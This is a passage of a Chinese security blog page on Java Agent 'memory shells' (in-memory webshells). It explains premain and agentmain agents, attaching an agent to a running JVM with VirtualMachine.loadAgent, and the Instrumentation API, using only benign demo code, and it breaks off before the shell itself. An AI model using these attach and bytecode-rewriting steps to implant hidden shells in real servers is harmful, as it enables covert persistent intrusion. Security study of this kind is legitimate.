@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="utf-8">
+
+    
+
+    <!-- 渲染优化 -->
+    <meta name="renderer" content="webkit">
+    <meta name="force-rendering" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="HandheldFriendly" content="True" >
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <!--icon-->
+
+    
+    
+    
+    
+    
+
+
+    <!-- meta -->
+
+
+<title>Java内存马-Agent内存马分析与实现 | Wileysec&#39;s Blog</title>
+
+
+    <meta name="keywords" content="Java安全, 内存马, Agent内存马">
+
+
+
+
+    <!-- OpenGraph -->
+ 
+    <meta name="description" content="Java Agent简介JDK1.5以后引入了 java.lang.instrument 包，该包常用于日志记录、性能监控、安全监察、诊断等场景，Java Agent可以在不影响正常编译的情况下来修改字节码 使用Java Agent需要编写一个代理类和一个代理配置文件（META-INF&#x2F;MANIFEST.MF），并将其打包为一个JAR文件。然后，在启动Java应用程序时，通过-javaa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java内存马-Agent内存马分析与实现">
+<meta property="og:url" content="https://wileysec.github.io/c92b2696b98a.html">
+<meta property="og:site_name" content="Wileysec&#39;s Blog">
+<meta property="og:description" content="Java Agent简介JDK1.5以后引入了 java.lang.instrument 包，该包常用于日志记录、性能监控、安全监察、诊断等场景，Java Agent可以在不影响正常编译的情况下来修改字节码 使用Java Agent需要编写一个代理类和一个代理配置文件（META-INF&#x2F;MANIFEST.MF），并将其打包为一个JAR文件。然后，在启动Java应用程序时，通过-javaa">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wileysec.github.io/images/Agent%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230914151759092.png">
+<meta property="og:image" content="https://wileysec.github.io/images/Agent%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230914165046460.png">
+<meta property="og:image" content="https://wileysec.github.io/images/Agent%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230920164226906.png">
+<meta property="og:image" content="https://wileysec.github.io/images/Agent%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230920170721999.png">
+<meta property="og:image" content="https://wileysec.github.io/images/Agent%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230920170751288.png">
+<meta property="og:image" content="https://wileysec.github.io/images/Agent%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230920171847143.png">
+<meta property="article:published_time" content="2023-09-14T01:34:38.823Z">
+<meta property="article:modified_time" content="2023-09-20T14:03:02.873Z">
+<meta property="article:author" content="wileysec">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="内存马">
+<meta property="article:tag" content="Agent内存马">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wileysec.github.io/images/Agent%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230914151759092.png">
+
+
+    
+<link rel="stylesheet" href="/css/style/main.css">
+ 
+
+    
+    
+    
+    
+        <link rel="stylesheet" id="hl-default-theme" href="https://cdn.jsdelivr.net/npm/prismjs@1.21.0/themes/prism-tomorrow.min.css" media="none" >
+        
+    
+    
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/line-numbers/prism-line-numbers.min.css" media="none" onload="this.media='all'">
+    
+
+
+    
+    
+<link rel="stylesheet" href="/css/style/dark.css">
+
+    
+<script src="/js/darkmode.js"></script>
+
+
+
+     
+
+    <!-- custom head -->
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <body>
+        <div id="app" tabindex="-1">
+            <header class="header">
+    <div class="header__left">
+        <a href="/" class="button">
+            <span class="logo__text">Wiley&#39;s Blog</span>
+        </a>
+    </div>
+    <div class="header__right">
+        
+            <div class="navbar__menus">
+                
+                    <a href="/" class="navbar-menu button">首页</a>
+                
+                    <a href="/tags/" class="navbar-menu button">标签</a>
+                
+                    <a href="/archives/" class="navbar-menu button">归档</a>
+                
+                    <a href="/links/" class="navbar-menu button">链接</a>
+                
+                    <a href="/about/" class="navbar-menu button">关于我</a>
+                
+            </div>
+        
+        
+        
+    <a href="/search/" id="btn-search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="24" height="24" fill="currentColor" stroke="currentColor" stroke-width="32"><path d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z"></path></svg>
+    </a>
+
+
+        
+        
+    <a href="javaScript:void(0);" id="btn-toggle-dark">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+    </a>
+
+
+        
+            <a class="dropdown-icon button" id="btn-dropdown" tabindex="0"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width='24' height='24' fill="none" stroke="currentColor" stroke-width="0.7" stroke-linecap="round" stroke-linejoin="round"><path fill="currentColor" d="M3.314,4.8h13.372c0.41,0,0.743-0.333,0.743-0.743c0-0.41-0.333-0.743-0.743-0.743H3.314c-0.41,0-0.743,0.333-0.743,0.743C2.571,4.467,2.904,4.8,3.314,4.8z M16.686,15.2H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,15.2,16.686,15.2z M16.686,9.257H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,9.257,16.686,9.257z"></path></svg></a>
+            <div class="dropdown-menus" id="dropdown-menus">
+                
+                    <a href="/" class="dropdown-menu button">首页</a>
+                
+                    <a href="/tags/" class="dropdown-menu button">标签</a>
+                
+                    <a href="/archives/" class="dropdown-menu button">归档</a>
+                
+                    <a href="/links/" class="dropdown-menu button">链接</a>
+                
+                    <a href="/about/" class="dropdown-menu button">关于我</a>
+                
+            </div>
+        
+    </div>
+</header>
+
+
+            <main class="main">
+    
+
+<div class="post-title">
+    <h1 class="post-title__text">
+        Java内存马-Agent内存马分析与实现
+    </h1>
+    <div class="post-title__meta">
+        <a href="/archives/2023/09/" class="post-meta__date button">文章创建于 2023-09-14</a>
+        
+    <span class="separate-dot"></span><a href="/categories/Java%E5%AE%89%E5%85%A8/" class="button">Java安全</a>
+
+ 
+        
+    
+    
+
+
+ 
+
+ 
+    </div>
+</div>
+
+
+    <aside class="post-side">
+        <div class="post-side__toc">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-Agent%E7%AE%80%E4%BB%8B"><span class="toc-text">Java Agent简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E5%90%8E%E5%8A%A0%E8%BD%BD"><span class="toc-text">启动后加载</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#VirtualMachine"><span class="toc-text">VirtualMachine</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VirtualMachineDescriptor"><span class="toc-text">VirtualMachineDescriptor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#agentmain%E7%A4%BA%E4%BE%8B"><span class="toc-text">agentmain示例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E4%BF%AE%E6%94%B9%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-text">动态修改字节码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Instrumentation"><span class="toc-text">Instrumentation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ClassFileTransformer"><span class="toc-text">ClassFileTransformer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#addTransformer"><span class="toc-text">addTransformer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getAllLoadedClasses"><span class="toc-text">getAllLoadedClasses</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#retransformClasses"><span class="toc-text">retransformClasses</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Agent%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">Agent内存马</span></a></li></ol>
+        </div>
+    </aside>
+    <a class="btn-toc button" id="btn-toc" tabindex="0">
+        <svg viewBox="0 0 1024 1024" width="32" height="32" xmlns="http://www.w3.org/2000/svg">
+            <path d="M128 256h64V192H128zM320 256h576V192H320zM128 544h64v-64H128zM320 544h576v-64H320zM128 832h64v-64H128zM320 832h576v-64H320z" fill="currentColor"></path>
+        </svg>
+    </a>
+    <div class="toc-menus" id="toc-menus">
+        <div class="toc-title">Article Directory</div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-Agent%E7%AE%80%E4%BB%8B"><span class="toc-text">Java Agent简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E5%90%8E%E5%8A%A0%E8%BD%BD"><span class="toc-text">启动后加载</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#VirtualMachine"><span class="toc-text">VirtualMachine</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VirtualMachineDescriptor"><span class="toc-text">VirtualMachineDescriptor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#agentmain%E7%A4%BA%E4%BE%8B"><span class="toc-text">agentmain示例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E4%BF%AE%E6%94%B9%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-text">动态修改字节码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Instrumentation"><span class="toc-text">Instrumentation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ClassFileTransformer"><span class="toc-text">ClassFileTransformer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#addTransformer"><span class="toc-text">addTransformer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getAllLoadedClasses"><span class="toc-text">getAllLoadedClasses</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#retransformClasses"><span class="toc-text">retransformClasses</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Agent%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">Agent内存马</span></a></li></ol>
+    </div>
+
+
+<article class="post post__with-toc content-card">
+    <div class="post__header"></div>
+    <div class="post__content">
+        <h2 id="Java-Agent简介"><a href="#Java-Agent简介" class="headerlink" title="Java Agent简介"></a>Java Agent简介</h2><p>JDK1.5以后引入了 <code>java.lang.instrument</code> 包，该包常用于日志记录、性能监控、安全监察、诊断等场景，Java Agent可以在不影响正常编译的情况下来修改字节码</p>
+<p>使用Java Agent需要编写一个代理类和一个代理配置文件（META-INF&#x2F;MANIFEST.MF），并将其打包为一个JAR文件。然后，在启动Java应用程序时，通过<code>-javaagent</code>参数指定代理JAR文件的路径，Java虚拟机（JVM）将会加载并运行代理</p>
+<p>Java Agent也是一个Java类，普通类的入口函数通常是 <code>main</code> 方法，而Java Agent的入口函数为 <code>premain</code> 或 <code>agentmain</code> 方法</p>
+<p>Java Agent支持两种加载方式：</p>
+<ol>
+<li><code>premain</code> 方法，在启动时加载</li>
+<li><code>agentmain</code> 方法，在启动后加载</li>
+</ol>
+<p>##启动时加载</p>
+<p>启动时加载agent，需要实现premain方法，还需要在jar文件清单中包含 <code>Premain-Class</code> 属性</p>
+<p>编写一个实现premain方法的类</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span></span><span class="token class-name">Instrumentation</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Agent_Premain</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">premain</span><span class="token punctuation">(</span><span class="token class-name">String</span> args<span class="token punctuation">,</span><span class="token class-name">Instrumentation</span> inst<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Agent Premain执行..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>还需要编写 <code>MANIFEST</code> JAR文件清单，这里保存为 <code>Agent.MF</code> 文件，文件最后需要有一行空行</p>
+<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">Manifest-Version</span><span class="token punctuation">:</span> <span class="token number">1.0</span>
+<span class="token key atrule">Premain-Class</span><span class="token punctuation">:</span> Agent_Premain
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>编译Agent_Premain类为class文件</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">javac Agent_Premain.java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>打包成jar文件</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">jar cvfm Agent.jar Agent.MF Agent_Premain.class<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>执行完后即可生成Agent.jar文件</p>
+<p>再生成一个普通的类</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Test main()..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>再写一个JAR文件清单</p>
+<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">Manifest-Version</span><span class="token punctuation">:</span> <span class="token number">1.0</span>
+<span class="token key atrule">Main-Class</span><span class="token punctuation">:</span> Test
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>再进行编译和打包成JAR文件</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">javac Test.java
+jar cvfm Test.jar Test.MF Test.class<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>我们运行Test.jar文件时，在前缀加上 <code>-javaagent</code> 参数加载 <code>Agent.jar</code>，<code>test1</code> 为Agent.jar文件入口函数premain的参数</p>
+<p><img src="/images/Agent%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230914151759092.png" alt="image-20230914151759092"></p>
+<p>运行之后可以发现Agent.jar文件先被执行了</p>
+<h2 id="启动后加载"><a href="#启动后加载" class="headerlink" title="启动后加载"></a>启动后加载</h2><h3 id="VirtualMachine"><a href="#VirtualMachine" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h3><p>VirtualMachine类是Java虚拟机的一个抽象表示，它提供了与虚拟机相关的操作和属性的访问方法，主要用于与Java虚拟机进行交互和管理，通常用于开发调试工具和性能分析工具</p>
+<p>该类我们主要会使用以下方法：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 远程连接到指定PID的JVM</span>
+<span class="token class-name">VirtualMachine</span><span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment">// 给JVM加载指定Agent</span>
+<span class="token class-name">VirtualMachine</span><span class="token punctuation">.</span><span class="token function">loadAgent</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment">// 获取所有的JVM列表</span>
+<span class="token class-name">VirtualMachine</span><span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment">// 关闭与JVM的连接</span>
+<span class="token class-name">VirtualMachine</span><span class="token punctuation">.</span><span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="VirtualMachineDescriptor"><a href="#VirtualMachineDescriptor" class="headerlink" title="VirtualMachineDescriptor"></a>VirtualMachineDescriptor</h3><p>VirtualMachineDescriptor类是描述Java虚拟机实例的信息的类，它提供了一些方法来获取虚拟机的标识、名称、虚拟机参数等信息</p>
+<h3 id="agentmain示例"><a href="#agentmain示例" class="headerlink" title="agentmain示例"></a>agentmain示例</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token static">sleep</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">VirtualMachine_Test</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"VirtualMachine_Test..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>编写一个普通类，用于模拟程序运行</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span></span><span class="token class-name">Instrumentation</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token static">sleep</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">VirtualMachine_Agent</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">agentmain</span><span class="token punctuation">(</span><span class="token class-name">String</span> args<span class="token punctuation">,</span> <span class="token class-name">Instrumentation</span> inst<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Inject_Agent..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Manifest</span><span class="token operator">-</span><span class="token class-name">Version</span><span class="token operator">:</span> <span class="token number">1.0</span>
+<span class="token class-name">Agent</span><span class="token operator">-</span><span class="token class-name">Class</span><span class="token operator">:</span> <span class="token class-name">VirtualMachine_Agent</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">javac VirtualMachine_Agent.java
+jar cvfm VirtualMachine_Agent.jar VirtualMachine_Agent.MF VirtualMachine_Agent.class<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>编写实现agentmain方法的类，并配置JAR文件清单，生成class文件和生成JAR文件</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>attach<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Inject_Agent</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">AttachNotSupportedException</span><span class="token punctuation">,</span> <span class="token class-name">AgentLoadException</span><span class="token punctuation">,</span> <span class="token class-name">AgentInitializationException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">VirtualMachineDescriptor</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token class-name">VirtualMachine</span><span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">VirtualMachineDescriptor</span> vm <span class="token operator">:</span> list<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token comment">// 寻找指定名称的JVM</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>vm<span class="token punctuation">.</span><span class="token function">displayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"VirtualMachine_Test"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token comment">// 连接指定ID的JVM</span>
+                <span class="token class-name">VirtualMachine</span> attach <span class="token operator">=</span> <span class="token class-name">VirtualMachine</span><span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>vm<span class="token punctuation">.</span><span class="token function">id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token comment">// 加载Agent</span>
+                attach<span class="token punctuation">.</span><span class="token function">loadAgent</span><span class="token punctuation">(</span><span class="token string">"/Users/wiley/IdeaProjects/JavaAgentMemShell/src/main/java/VirtualMachine_Agent.jar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token comment">// 关闭JVM连接</span>
+                attach<span class="token punctuation">.</span><span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>编写一个用于连接名称为 <code>VirtualMachine_Test</code> 的JVM，加载指定的Agent </p>
+<p><img src="/images/Agent%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230914165046460.png" alt="image-20230914165046460"></p>
+<p>当我们运行 <code>VirtualMachine_Test</code> 类后，再运行 <code>Inject_Agent</code> 类，可以发现我们的自定义Agent已经成功被加载</p>
+<h2 id="动态修改字节码"><a href="#动态修改字节码" class="headerlink" title="动态修改字节码"></a>动态修改字节码</h2><h3 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h3><p>Instrumentation是JVMTIAgent（JVM Tool Interface Agent），用于在运行时修改、监控和分析Java应用程序的字节码，它允许开发人员在应用程序启动之前或在运行时对字节码进行转换和增强</p>
+<p>Instrumentation是一个接口，其主要方法如下：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 添加一个Class文件的转换器，转换器用于改变Class二进制流的数据，第二个参数为是否允许重新转换</span>
+<span class="token keyword">void</span> <span class="token function">addTransformer</span><span class="token punctuation">(</span><span class="token class-name">ClassFileTransformer</span> transformer<span class="token punctuation">,</span> <span class="token keyword">boolean</span> canRetransform<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">void</span> <span class="token function">addTransformer</span><span class="token punctuation">(</span><span class="token class-name">ClassFileTransformer</span> transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 删除一个类转换器</span>
+<span class="token keyword">boolean</span> <span class="token function">removeTransformer</span><span class="token punctuation">(</span><span class="token class-name">ClassFileTransformer</span> transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 重新定义Class</span>
+<span class="token keyword">void</span> <span class="token function">retransformClasses</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> classes<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">UnmodifiableClassException</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 判断一个类是否可被修改</span>
+<span class="token keyword">boolean</span> <span class="token function">isModifiableClass</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> theClass<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 获取目标已经加载的类</span>
+<span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"rawtypes"</span><span class="token punctuation">)</span>
+<span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getAllLoadedClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 获取一个对象的大小</span>
+<span class="token keyword">long</span> <span class="token function">getObjectSize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> objectToSize<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="ClassFileTransformer"><a href="#ClassFileTransformer" class="headerlink" title="ClassFileTransformer"></a>ClassFileTransformer</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ClassFileTransformer</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token function">transform</span><span class="token punctuation">(</span>  <span class="token class-name">ClassLoader</span>         loader<span class="token punctuation">,</span>
+                <span class="token class-name">String</span>              className<span class="token punctuation">,</span>
+                <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span>            classBeingRedefined<span class="token punctuation">,</span>
+                <span class="token class-name">ProtectionDomain</span>    protectionDomain<span class="token punctuation">,</span>
